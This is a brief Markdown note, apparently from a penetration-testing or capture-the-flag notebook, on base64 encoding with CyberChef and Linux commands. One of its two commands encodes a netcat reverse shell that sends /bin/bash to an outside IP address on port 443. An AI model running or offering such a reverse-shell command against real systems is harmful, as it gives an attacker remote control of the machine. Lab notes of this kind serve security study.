---
publish: true
created: 2026-02-06T16:47:40.274+05:30
modified: 2026-06-22T08:59:21.980+05:30
---

## base64

Use [Cyberchef](https://gchq.github.io/CyberChef/).
or using linux as below.

```
echo -n "Your text here" | iconv -t UTF-16LE | base64
echo nc -e /bin/bash 10.10.14.7 443 | base64 -w0
```
